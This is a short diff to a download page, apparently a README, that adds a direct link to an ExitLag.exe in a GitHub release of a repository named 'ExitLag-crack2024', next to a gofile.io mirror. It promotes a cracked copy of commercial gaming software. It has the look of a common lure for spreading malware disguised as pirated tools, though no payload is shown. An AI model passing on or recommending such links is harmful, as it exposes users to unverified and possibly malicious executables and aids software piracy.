@@ -1,6 +1,6 @@
 Download =====> 
 
-"1" 
+"1" https://github.com/jayxyzn/ExitLag-crack2024/releases/download/update/ExitLag.exe
 
 "2" https://gofile.io/d/zEy5ze 
 
